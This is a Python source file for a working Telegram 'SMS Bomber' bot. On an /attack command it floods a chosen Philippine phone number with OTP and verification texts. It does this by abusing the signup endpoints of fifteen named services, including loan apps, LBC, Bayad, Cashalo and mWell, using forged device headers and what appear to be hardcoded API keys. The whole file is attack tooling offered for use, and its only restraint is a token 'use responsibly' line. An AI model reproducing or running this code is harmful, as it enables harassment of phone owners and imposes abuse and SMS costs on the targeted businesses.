# main.py - Fixed for Python 3.14 compatibility
import os
import logging
import random
import string
import time
import re
import hashlib
import uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
import requests
import asyncio
import sys

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Get bot token from environment variable
BOT_TOKEN = os.environ.get("BOT_TOKEN")

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN environment variable is not set!")
    logger.error("Please set it in Render: Environment → Add Environment Variable")
    logger.error("Key: BOT_TOKEN, Value: your_token_from_BotFather")
    sys.exit(1)

logger.info(f"✅ Bot token loaded successfully (length: {len(BOT_TOKEN)})")

class BombService:
    def __init__(self):
        self.active_attacks = {}
        self.stats = {}
        
    def format_phone(self, phone):
        phone = str(phone).strip()
        phone = phone.replace(' ', '').replace('-', '').replace('+', '')
        if phone.startswith('0'):
            phone = phone[1:]
        elif phone.startswith('63'):
            phone = phone[2:]
        return phone
    
    def random_string(self, length):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def random_gmail(self):
        n = random.randint(8, 12)
        return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n)) + "@gmail.com"
    
    def generate_kumu_signature(self, timestamp, random_str, phone_number):
        secret = "kumu_secret_2024"
        data = f"{timestamp}{random_str}{phone_number}{secret}"
        return hashlib.sha256(data.encode()).hexdigest()
    
    # Service implementations (same as before - keeping for brevity)
    def send_bomb_otp(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'OSIM/1.55.0 (Android 16; CPH2465; OP5958L1; arm64-v8a)',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'region': 'PH'
            }
            credentials = {
                "userName": formatted_phone,
                "phoneCode": "63",
                "password": f"TempPass{random.randint(1000, 9999)}!"
            }
            response = requests.post("https://prod.services.osim-cloud.com/identity/api/v1.0/account/register", 
                                   headers=headers, json=credentials, timeout=8)
            if response.status_code == 200:
                result = response.json()
                if result.get('resultCode', 0) in [201000, 200000]:
                    return True, result.get('message', 'Bomb sent')
                else:
                    return False, result.get('message', f"Failed with code {result.get('resultCode')}")
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}"
    
    def send_ezloan(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            current_time = int(time.time() * 1000)
            
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'imei': '7a997625bd704baebae5643a3289eb33',
                'device': 'android',
                'brand': 'oneplus',
                'model': 'CPH2465',
                'source': 'EZLOAN',
                'appversion': '2.0.4',
                'businessid': 'EZLOAN',
                'blackbox': f'kGPGg{current_time}DCl3O8MVBR0',
            }
            
            data = {
                "businessId": "EZLOAN",
                "contactNumber": f"+63{formatted_phone}",
                "appsflyerIdentifier": f"{current_time}-{random.randint(1000000000000000000, 9999999999999999999)}"
            }
            
            response = requests.post('https://gateway.ezloancash.ph/security/auth/otp/request', 
                                   headers=headers, json=data, timeout=8)
            
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('code') == 0:
                    return True, resp_json.get('msg', 'Sent successfully')
                else:
                    return False, resp_json.get('msg', 'Request failed')
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_xpress(self, phone_number, index):
        try:
            headers = {
                "User-Agent": "Dalvik/2.1.0", 
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
            timestamp = int(time.time())
            data = {
                "FirstName": f"User{timestamp}_{index}",
                "LastName": "Test",
                "Email": f"user{timestamp}_{index}@gmail.com",
                "Phone": f"+63{self.format_phone(phone_number)}",
                "Password": f"Pass{random.randint(1000, 9999)}",
                "ConfirmPassword": f"Pass{random.randint(1000, 9999)}"
            }
            response = requests.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", 
                                   headers=headers, json=data, timeout=8)
            if response.status_code == 200:
                return True, "OTP sent to phone"
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_abenson(self, phone_number):
        try:
            headers = {
                'User-Agent': 'okhttp/4.9.0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json'
            }
            data = f'contact_no={phone_number}&login_token=undefined'
            response = requests.post('https://api.mobile.abenson.com/api/public/membership/activate_otp', 
                                   headers=headers, data=data, timeout=8)
            if response.status_code == 200:
                return True, "OTP activation sent"
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_excellent_lending(self, phone_number):
        try:
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Content-Type': 'application/json; charset=utf-8',
                'Accept': 'application/json'
            }
            data = {
                "domain": phone_number,
                "cat": "login",
                "previous": False,
                "financial": self.random_string(32)
            }
            response = requests.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', 
                                   headers=headers, json=data, timeout=8)
            if response.status_code == 200:
                return True, "Request processed"
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_bistro(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 16; CPH2465) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate',
                'origin': 'http://localhost',
                'x-requested-with': 'com.allcardtech.bistro',
                'accept-language': 'en-US,en;q=0.9',
            }
            
            url = f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{formatted_phone}'
            
            response = requests.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('isSuccessful') == True:
                    return True, resp_json.get('message', 'OTP sent successfully')
                else:
                    return False, f"API Error: {resp_json.get('message', 'Unknown error')}"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}"
    
    def send_bayad(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            bayad_phone = f"+63{formatted_phone}"
            
            headers = {
                "accept": 'application/json, text/plain, */*',
                "accept-language": 'en-US',
                "content-type": 'application/json',
                "origin": 'https://www.online.bayad.com',
                "referer": 'https://www.online.bayad.com/',
                "user-agent": 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            }
            
            email = self.random_gmail()
            
            payload = {
                "mobileNumber": bayad_phone, 
                "emailAddress": email
            }
            
            response = requests.post(
                "https://api.online.bayad.com/api/sign-up/otp",
                headers=headers,
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                return True, f"OTP sent to {email}"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}"
    
    def send_lbc(self, phone_number):
        try:
            headers = {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json'
            }
            data = {
                'verification_type': 'mobile',
                'client_email': f'{self.random_string(8)}@gmail.com',
                'client_contact_code': '+63',
                'client_contact_no': self.format_phone(phone_number),
                'app_log_uid': self.random_string(16)
            }
            response = requests.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', 
                                   headers=headers, data=data, timeout=8)
            if response.status_code == 200:
                return True, "Verification request sent"
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_pickup_coffee(self, phone_number):
        try:
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
            data = {
                "mobile_number": f"+63{self.format_phone(phone_number)}",
                "login_method": 'mobile_number'
            }
            response = requests.post('https://production.api.pickup-coffee.net/v2/customers/login', 
                                   headers=headers, json=data, timeout=8)
            if response.status_code == 200:
                return True, "Login OTP sent"
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_honey_loan(self, phone_number):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
            data = {
                "phone": phone_number,
                "is_rights_block_accepted": 1
            }
            response = requests.post('https://api.honeyloan.ph/api/client/registration/step-one', 
                                   headers=headers, json=data, timeout=8)
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('success') == True:
                    return True, "Registration step one completed"
                else:
                    return False, resp_json.get('message', 'Registration failed')
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_kumu_ph(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            
            encrypt_timestamp = int(time.time())
            encrypt_rnd_string = self.random_string(32)
            encrypt_signature = self.generate_kumu_signature(encrypt_timestamp, encrypt_rnd_string, formatted_phone)
            
            headers = {
                'User-Agent': 'okhttp/5.0.0-alpha.14',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json;charset=UTF-8',
                'Device-Type': 'android',
                'Device-Id': '07b76e92c40b536a',
                'Version-Code': '1669',
            }
            
            data = {
                "country_code": "+63",
                "encrypt_rnd_string": encrypt_rnd_string,
                "cellphone": formatted_phone,
                "encrypt_signature": encrypt_signature,
                "encrypt_timestamp": encrypt_timestamp
            }
            
            response = requests.post(
                'https://api.kumuapi.com/v2/user/sendverifysms',
                headers=headers,
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('code') in [200, 403]:
                    return True, resp_json.get('message', 'OTP sent')
                else:
                    return False, f"API Error: {resp_json.get('message', 'Unknown error')}"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}"
    
    def send_s5_otp(self, phone_number):
        try:
            normalized_phone = f"+63{self.format_phone(phone_number)}"
            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            headers = {
                'accept': 'application/json, text/plain, */*',
                'content-type': f'multipart/form-data; boundary={boundary}',
                'user-agent': 'Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36'
            }
            body = f'--{boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n{normalized_phone}\r\n--{boundary}--\r\n'
            
            response = requests.post('https://api.s5.com/player/api/v1/otp/request', 
                                   headers=headers, data=body, timeout=8)
            if response.status_code == 200:
                return True, "OTP request sent to S5.com"
            return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def send_cashalo(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            
            device_identifier = str(uuid.uuid4())[:16].replace('-', '')
            apps_flyer_id = f"{int(time.time() * 1000)}-{str(uuid.uuid4().int)[:15]}"
            advertising_id = str(uuid.uuid4())
            firebase_id = str(uuid.uuid4().hex)
            
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==',
                'x-device-identifier': device_identifier,
                'x-device-type': '1',
                'x-firebase-instance-id': firebase_id
            }
            
            data = {
                "phone_number": formatted_phone,
                "device_identifier": device_identifier,
                "device_type": 1,
                "apps_flyer_device_id": apps_flyer_id,
                "advertising_id": advertising_id
            }
            
            response = requests.post('https://api.cashaloapp.com/access/register',
                                   headers=headers, json=data, timeout=10)
            
            if response.status_code == 200:
                response_data = response.json()
                if 'access_challenge_request' in response_data:
                    return True, f"OTP sent - Challenge: {response_data['access_challenge_request'][:10]}..."
                else:
                    return False, "Unexpected response format"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}"
    
    def send_mwell(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            
            headers = {
                'User-Agent': 'okhttp/4.11.0',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
                'x-app-version': random.choice(['03.942.035', '03.942.036', '03.942.037', '03.942.038']),
                'x-device-type': 'android',
                'x-device-model': random.choice(['oneplus CPH2465', 'samsung SM-G998B', 'xiaomi Redmi Note 13']),
                'x-timestamp': str(int(time.time() * 1000)),
                'x-request-id': self.random_string(16)
            }
            
            data = {
                "country": "PH",
                "phoneNumber": formatted_phone,
                "phoneNumberPrefix": "+63"
            }
            
            response = requests.post('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number', 
                                   headers=headers, json=data, timeout=20)
            
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('c') == 200:
                    return True, "OTP sent successfully"
                else:
                    return False, f"API Error: Code {resp_json.get('c')}"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}"
    
    def send_pexx(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'x-msession-id': 'undefined',
                'x-oid': '',
                'tid': self.random_string(11),
                'appversion': '3.0.14',
                'sentry-trace': self.random_string(32),
                'baggage': 'sentry-environment=production,sentry-public_key=811267d2b611af4416884dd91d0e093c,sentry-trace_id=' + self.random_string(32)
            }
            
            data = {
                "0": {
                    "json": {
                        "email": "",
                        "areaCode": "+63",
                        "phone": f"+63{formatted_phone}",
                        "otpChannel": "TG",
                        "otpUsage": "REGISTRATION"
                    }
                }
            }
            
            response = requests.post('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1',
                                   headers=headers, json=data, timeout=20)
            
            if response.status_code == 200:
                try:
                    resp_json = response.json()
                    if isinstance(resp_json, list) and len(resp_json) > 0:
                        result_data = resp_json[0].get('result', {}).get('data', {}).get('json', {})
                        if result_data.get('code') == 200:
                            return True, "OTP sent successfully"
                        else:
                            return False, f"API Error: {result_data.get('msg', 'Unknown error')}"
                    else:
                        return False, "Invalid response format"
                except:
                    return False, "Response parsing error"
            else:
                return False, f"HTTP {response.status_code}"
                
        except Exception as e:
            return False, f"Connection error: {str(e)[:50]}"

    async def run_attack(self, chat_id, phone_number, batches, update_callback):
        self.active_attacks[chat_id] = {
            'running': True,
            'stats': {'success': 0, 'fail': 0, 'total': 0}
        }
        
        services = [
            ("💣 BOMB OTP", self.send_bomb_otp),
            ("💰 EZLOAN", self.send_ezloan),
            ("📺 ABENSON", self.send_abenson),
            ("💵 EXCELLENT LENDING", self.send_excellent_lending),
            ("🍽️ BISTRO", self.send_bistro),
            ("🏦 BAYAD CENTER", self.send_bayad),
            ("📦 LBC CONNECT", self.send_lbc),
            ("☕ PICKUP COFFEE", self.send_pickup_coffee),
            ("🍯 HONEY LOAN", self.send_honey_loan),
            ("🎭 KUMU PH", self.send_kumu_ph),
            ("🎮 S5.COM", self.send_s5_otp),
            ("💳 CASHALO", self.send_cashalo),
            ("🏥 MWELL", self.send_mwell),
            ("💱 PEXX", self.send_pexx),
            ("✈️ XPRESS PH", lambda p: self.send_xpress(p, random.randint(1, 999)))
        ]
        
        for batch_num in range(1, batches + 1):
            if not self.active_attacks.get(chat_id, {}).get('running', False):
                await update_callback(f"🛑 Attack stopped by user")
                break
            
            with ThreadPoolExecutor(max_workers=15) as executor:
                futures = []
                for service_name, service_func in services:
                    future = executor.submit(service_func, phone_number)
                    futures.append((service_name, future))
                
                for service_name, future in futures:
                    try:
                        success, message = future.result(timeout=10)
                        if success:
                            self.active_attacks[chat_id]['stats']['success'] += 1
                        else:
                            self.active_attacks[chat_id]['stats']['fail'] += 1
                        self.active_attacks[chat_id]['stats']['total'] += 1
                    except Exception as e:
                        self.active_attacks[chat_id]['stats']['fail'] += 1
                        self.active_attacks[chat_id]['stats']['total'] += 1
            
            stats = self.active_attacks[chat_id]['stats']
            progress_msg = (
                f"📊 **Batch {batch_num}/{batches} Complete**\n"
                f"✅ Success: {stats['success']}\n"
                f"❌ Failed: {stats['fail']}\n"
                f"📈 Total: {stats['total']}\n"
                f"🎯 Success Rate: {(stats['success']/stats['total']*100):.1f}%\n"
                f"⏳ Remaining: {batches - batch_num} batches"
            )
            await update_callback(progress_msg)
            
            if batch_num < batches:
                await asyncio.sleep(random.uniform(2, 4))
        
        final_stats = self.active_attacks[chat_id]['stats']
        summary = (
            f"🎯 **Attack Completed!**\n\n"
            f"📱 Target: `{phone_number}`\n"
            f"🔄 Total Batches: {batches}\n"
            f"✅ Successful Requests: {final_stats['success']}\n"
            f"❌ Failed Requests: {final_stats['fail']}\n"
            f"📊 Total Requests: {final_stats['total']}\n"
            f"🏆 Success Rate: {(final_stats['success']/final_stats['total']*100):.1f}%\n"
            f"⏱️ Completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        await update_callback(summary)
        
        self.active_attacks.pop(chat_id, None)

bomb_service = BombService()

# Styling function for cool text
def stylize_text(text):
    small_caps_map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ',
        'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ',
        'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ',
        'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ'
    }
    return "".join([small_caps_map.get(char.lower(), char) for char in text])

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = (
        f"🔥 **{stylize_text('SMS BOMBER BOT')}** 🔥\n\n"
        f"⚡ **Powerful SMS Bombing Service** ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💀 **Features:**\n"
        f"• 15+ Active Services\n"
        f"• Fast & Reliable\n"
        f"• Multi-Threaded Attacks\n"
        f"• Real-time Progress\n\n"
        f"📖 **How to Use:**\n"
        f"`/attack +639XXXXXXXXX` - Start attack\n"
        f"`/stop` - Stop current attack\n"
        f"`/status` - Check attack status\n"
        f"`/services` - List all services\n"
        f"`/help` - Show this menu\n\n"
        f"⚠️ **Disclaimer:** Use responsibly!\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
    )
    
    keyboard = [
        [InlineKeyboardButton("🚀 Start Attack", switch_inline_query_current_chat="")],
        [InlineKeyboardButton("📋 Services List", callback_data="services"),
         InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    if chat_id in bomb_service.active_attacks:
        await update.message.reply_text("⚠️ An attack is already running! Use /stop first.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ **Usage:** `/attack +639XXXXXXXXX [batches]`\n\n"
            "Example: `/attack +639123456789 3`\n"
            "Default batches: 1 (max: 10)",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    phone = context.args[0]
    batches = int(context.args[1]) if len(context.args) > 1 else 1
    
    if batches > 10:
        batches = 10
        await update.message.reply_text("⚠️ Maximum batches set to 10")
    
    # Validate phone number
    clean_phone = re.sub(r'[\s\-+]', '', phone)
    if clean_phone.startswith('0'):
        clean_phone = clean_phone[1:]
    elif clean_phone.startswith('63'):
        clean_phone = clean_phone[2:]
    
    if not re.match(r'^9\d{9}$', clean_phone):
        await update.message.reply_text(
            "❌ **Invalid Philippine Number!**\n\n"
            "Format: `+639XXXXXXXXX` or `09XXXXXXXXX`\n"
            "Example: `+639123456789`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    status_msg = await update.message.reply_text(
        f"🔥 **ATTACK STARTED!** 🔥\n\n"
        f"📱 Target: `{phone}`\n"
        f"🔄 Batches: {batches}\n"
        f"⚡ Status: Running...\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ Preparing services...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    async def update_status(message):
        try:
            await status_msg.edit_text(
                f"🔥 **ATTACK IN PROGRESS** 🔥\n\n"
                f"📱 Target: `{phone}`\n"
                f"🔄 Batches: {batches}\n"
                f"━━━━━━━━━━━━━━━━━━━\n\n"
                f"{message}",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            logger.error(f"Error updating status: {e}")
    
    await bomb_service.run_attack(chat_id, phone, batches, update_status)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    if chat_id in bomb_service.active_attacks:
        bomb_service.active_attacks[chat_id]['running'] = False
        await update.message.reply_text(
            "🛑 **Attack Stopped!**\n\n"
            "The attack has been terminated by your command.",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await update.message.reply_text(
            "ℹ️ No active attack is currently running.",
            parse_mode=ParseMode.MARKDOWN
        )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    if chat_id in bomb_service.active_attacks:
        stats = bomb_service.active_attacks[chat_id]['stats']
        if stats['total'] > 0:
            status_text = (
                f"📊 **Attack Status**\n"
                f"━━━━━━━━━━━━━━━━━━━\n\n"
                f"🟢 **Status:** Active\n"
                f"✅ **Success:** {stats['success']}\n"
                f"❌ **Failed:** {stats['fail']}\n"
                f"📈 **Total:** {stats['total']}\n"
                f"🎯 **Rate:** {(stats['success']/stats['total']*100):.1f}%"
            )
        else:
            status_text = (
                f"📊 **Attack Status**\n"
                f"━━━━━━━━━━━━━━━━━━━\n\n"
                f"🟢 **Status:** Active\n"
                f"⏳ **Initializing...**"
            )
        await update.message.reply_text(status_text, parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(
            "🟢 **Status:** Idle\n\n"
            "No active attacks running.\n"
            "Use `/attack +639XXXXXXXXX` to start.",
            parse_mode=ParseMode.MARKDOWN
        )

async def services_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    services_text = (
        f"📋 **Active Services**\n"
        f"━━━━━━━━━━━━━━━━━━━\n\n"
        f"💣 **SMS Services:**\n"
        f"• BOMB OTP\n"
        f"• EZLOAN\n"
        f"• ABENSON\n"
        f"• EXCELLENT LENDING\n"
        f"• BISTRO\n"
        f"• BAYAD CENTER\n"
        f"• LBC CONNECT\n"
        f"• PICKUP COFFEE\n"
        f"• HONEY LOAN\n"
        f"• KUMU PH\n"
        f"• S5.COM\n"
        f"• CASHALO\n"
        f"• MWELL\n"
        f"• PEXX\n"
        f"• XPRESS PH\n\n"
        f"✨ **Total:** 15 Active Services"
    )
    
    await update.message.reply_text(services_text, parse_mode=ParseMode.MARKDOWN)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        f"📖 **Help Guide**\n"
        f"━━━━━━━━━━━━━━━━━━━\n\n"
        f"**Commands:**\n"
        f"`/start` - Show bot info\n"
        f"`/attack <number> [batches]` - Start attack\n"
        f"`/stop` - Stop current attack\n"
        f"`/status` - Check attack status\n"
        f"`/services` - List all services\n"
        f"`/help` - Show this guide\n\n"
        f"**Examples:**\n"
        f"`/attack +639123456789`\n"
        f"`/attack +639123456789 5`\n\n"
        f"**Notes:**\n"
        f"• Max 10 batches per attack\n"
        f"• Each batch sends ~15 SMS\n"
        f"• Wait between attacks\n\n"
        f"⚠️ **Warning:** Use responsibly!"
    )
    
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "services":
        await services_command(update, context)
    elif query.data == "help":
        await help_command(update, context)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")

def main():
    """Start the bot"""
    logger.info("🚀 Starting Telegram SMS Bomber Bot...")
    
    # Create application with updated settings for Python 3.14
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .build()
    )
    
    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("services", services_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Callback handler
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Error handler
    application.add_error_handler(error_handler)
    
    # Start the bot
    logger.info("✅ Bot is running and waiting for commands...")
    application.run_polling()

if __name__ == "__main__":
    main()